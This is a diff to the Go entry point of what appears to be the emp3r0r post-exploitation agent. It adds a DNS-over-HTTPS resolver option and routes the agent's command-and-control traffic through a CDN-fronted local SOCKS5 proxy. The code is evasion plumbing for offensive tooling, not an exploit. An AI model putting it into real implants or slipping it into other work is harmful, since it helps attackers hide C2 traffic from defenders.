@@ -18,6 +18,7 @@ import (
 	"github.com/jm33-m0/emp3r0r/core/lib/tun"
 	"github.com/jm33-m0/emp3r0r/core/lib/util"
 	cdn2proxy "github.com/jm33-m0/go-cdn2proxy"
+	"github.com/ncruces/go-dns"
 )
 
 func main() {
@@ -128,22 +129,39 @@ func main() {
 		emp3r0r_data.AgentProxy = *c2proxy
 	}
 
+	// DNS
+	if *doh != "" {
+		emp3r0r_data.DoHServer = *doh
+	}
+	if emp3r0r_data.DoHServer != "" {
+		// use DoH resolver
+		net.DefaultResolver, err = dns.NewDoHResolver(
+			emp3r0r_data.DoHServer,
+			dns.DoHCache())
+		if err != nil {
+			log.Fatal(err)
+		}
+	}
+
 	// if user wants to use CDN proxy
 	if *cdnProxy != "" {
+		emp3r0r_data.CDNProxy = *cdnProxy
+	}
+	if emp3r0r_data.CDNProxy != "" {
 		go func() {
 			// DoH server
 			dns := "https://9.9.9.9/dns-query"
-			if *doh != "" {
-				dns = *doh
+			if emp3r0r_data.DoHServer != "" {
+				dns = emp3r0r_data.DoHServer
 			}
 
 			// you can change DoH server here if needed
-			err := cdn2proxy.StartProxy("127.0.0.1:10888", *cdnProxy, dns)
+			err := cdn2proxy.StartProxy("127.0.0.1:10888", emp3r0r_data.CDNProxy, dns)
 			if err != nil {
 				log.Fatal(err)
 			}
 		}()
-		emp3r0r_data.Transport = fmt.Sprintf("CDN (%s)", *cdnProxy)
+		emp3r0r_data.Transport = fmt.Sprintf("CDN (%s)", emp3r0r_data.CDNProxy)
 		emp3r0r_data.AgentProxy = "socks5://127.0.0.1:10888"
 	}
 
